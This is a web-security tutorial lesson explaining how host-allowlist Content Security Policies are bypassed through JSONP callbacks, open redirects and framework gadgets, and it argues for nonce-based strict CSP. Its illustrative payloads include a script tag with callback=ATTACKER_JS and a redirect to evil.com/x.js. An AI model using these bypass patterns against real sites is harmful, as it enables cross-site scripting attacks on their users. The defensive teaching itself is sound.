Content Security Policy · Lesson 6

Why host allowlists fail

L5 kept pointing here: host allowlists are bypassable "in most configurations." This lesson makes that concrete. The flaw isn't a typo in your policy — it's the model. "Trust this domain" quietly means "trust every byte that domain can be made to emit," and on real CDNs that includes attacker-chosen script. Google measured it across the web; the numbers are brutal.

The concept

A host-allowlist policy like script-src 'self' https://trusted-cdn.com https://apis.example.com encodes one assumption: a script served by an allowlisted origin is safe. That assumption is false whenever an allowlisted origin can be coerced into serving script the attacker controls — and popular domains can, routinely.1

The measurement (Weichselbaum et al., CCS 2016) Across 1,680,867 hosts and 26,011 unique policies: 94.72% of distinct policies contained a bypass; 75.81% used script allowlists an attacker could exploit; and 99.34% of hosts with CSP ran policies offering no benefit against XSS. Crucially: 14 of the 15 most-commonly-allowlisted script domains hosted unsafe endpoints. The allowlist model wasn't marginally weak — it was almost universally broken.1

The steps

Three ways an allowlisted origin turns into arbitrary script execution — plus the reason the list rots over time.

Policy:  script-src 'self' https://trusted-cdn.com

1. JSONP        <script src="https://trusted-cdn.com/api?callback=ATTACKER_JS">
                 → endpoint echoes ATTACKER_JS as executable script  ✓ allowlisted, ✓ runs
2. open redirect <script src="https://trusted-cdn.com/redirect?to=https://evil.com/x.js">
                 → 302 to evil.com; path check is DROPPED on redirect (L2)  ✓ runs
3. hosted gadget script-src includes a CDN that hosts AngularJS / a vulnerable lib
                 → injected markup uses the trusted lib as an execution gadget  ✓ runs
4. rot          the allowlist grows, vendors add endpoints, entries outlive their reason

Every one of these loads script from an origin your policy explicitly trusts. CSP does exactly what you told it — the instruction was just wrong.

Step 1 — JSONP endpoints: the trusted domain hands over the pen

A JSONP endpoint takes a callback parameter and reflects it into an executable script response: request …/api?callback=foo and you get back foo({…data…}). Set callback to attacker JavaScript instead of a function name and the trusted domain serves your code as script. Point a <script src> at that endpoint on an allowlisted host and CSP waves it through — the origin matches. This is why Google's study found unsafe endpoints on 14 of the 15 most-allowlisted domains: big API hosts ship JSONP.1

Step 2 — Open redirects: and the path restriction that evaporates

Suppose you were careful and path-restricted the entry: script-src https://trusted-cdn.com/safe/. An open redirect on that host — …/redirect?to=… — defeats it, because (from L2) the path component is not enforced after a redirect. The browser matches the initial request's scheme/host/port, follows the 302 to an attacker URL, and the path you pinned is never checked against the destination. Redirects turn a narrow, careful allowlist entry back into a broad one.2

Step 3 — Shared CDNs & framework gadgets

Two problems compound here. First, shared CDNs: PortSwigger's guidance is blunt — "content delivery networks (CDNs) that do not use per-customer URLs, such as ajax.googleapis.com, should not be trusted, because third parties can get content onto their domains."3 Second, gadgets: if an allowlisted CDN hosts a framework like AngularJS, injected markup can use that already-trusted library's templating to execute — no new script origin needed, just HTML that the trusted framework interprets.1

Step 4 — The list rots

Even a clean allowlist decays. Teams add a vendor for one feature and leave it forever; a trusted host adds a JSONP endpoint next quarter; an acquired subdomain changes hands. An allowlist is a standing claim about the current behaviour of every listed origin — a claim nobody re-verifies. Security that depends on continuous manual curation is security that quietly lapses.

Why this matters

1. The bug is in the model, not the policy. You cannot audit your way to a safe allowlist while trusted domains host JSONP, redirects, and frameworks. The correct response isn't "tighten the list" — it's "stop basing trust on the origin." That reframing is the entire motivation for strict CSP (L7).

2. Path restrictions give false comfort. The redirect rule you learned as a matching detail in L2 is an offensive tool here: it neutralizes the one control people reach for to narrow a broad host entry. Knowing L2's edge and L6's exploit are the same fact is the deep-understanding tell.

3. This is why nonces won. A nonce trusts a specific script element you emitted this response, not a domain that might be coerced. It can't be reached by a JSONP call, a redirect, or a hosted gadget, because none of those carry your fresh nonce. L7 builds the policy that leans on exactly that.

Key line "Host allowlists fail because trusting a domain means trusting anything it can be made to serve — and popular domains serve attacker-controllable script via JSONP endpoints (?callback= reflects your JS), open redirects (which also erase any path restriction, since CSP drops the path after a redirect), and hosted frameworks used as gadgets. Google measured ~95% of real policies bypassable. The fix isn't a tighter list; it's abandoning origin-based trust for nonces and 'strict-dynamic'."
The trap Shallow: "allowlists are fine if you only list domains you trust." That's the exact fallacy the CCS 2016 data demolishes — the most-trusted domains (Google APIs, major CDNs) were the ones with JSONP and redirects. Naming a concrete vector (JSONP ?callback=, or the redirect-drops-path trick) and citing "trusted ≠ un-coercible" separates a real answer from a hand-wave.

Recall — answer out loud before peeking:

① Policy is script-src https://trusted-cdn.com. The CDN has a JSONP endpoint. How does an attacker run arbitrary JS?

show answer

Inject <script src="https://trusted-cdn.com/api?callback=ATTACKER_JS">. The endpoint reflects the callback value into an executable script response, served from the allowlisted origin — so CSP allows it and the attacker's JS runs.

② You pinned script-src https://cdn.com/safe/. Why doesn't the path restriction save you if the host has an open redirect?

show answer

CSP drops the path component after a redirect (L2). The 302 to an attacker URL is followed, and only the original scheme/host/port were matched — the pinned path is never checked against the destination.

③ Why is a nonce-based policy not vulnerable to the JSONP/redirect/gadget bypasses?

show answer

A nonce trusts a specific element carrying your fresh per-response value — not an origin. A JSONP call, redirect, or hosted gadget can't produce a script element bearing that nonce, so none of them are authorized.

④ Roughly what fraction of real CSP policies did Google find bypassable, and what made the "most-trusted" domains the problem?

show answer

~94.7% of distinct policies had a bypass; ~99% of hosts got no XSS benefit. The most-allowlisted domains were the problem precisely because they host JSONP/redirect/framework endpoints — 14 of the top 15 had unsafe endpoints.

Primary source — read this one "CSP Is Dead, Long Live CSP!" — Weichselbaum, Spagnuolo, Akrout, Lekies (ACM CCS 2016). The measurement study behind this entire lesson and the strict-CSP push. Read the abstract and §3 (the bypass taxonomy). Then run a real policy through Google's CSP Evaluator and watch it flag the exact endpoints this lesson describes.
Reproduce one to own it. Walking a specific bypass end-to-end — a JSONP chain, or the redirect-path trick — is the fastest way to be able to narrate it cold in an interview. Lesson 7 is the payoff: the strict CSP that makes all four of these vectors irrelevant — nonces + 'strict-dynamic', with object-src 'none' and base-uri 'none' closing the flanks.
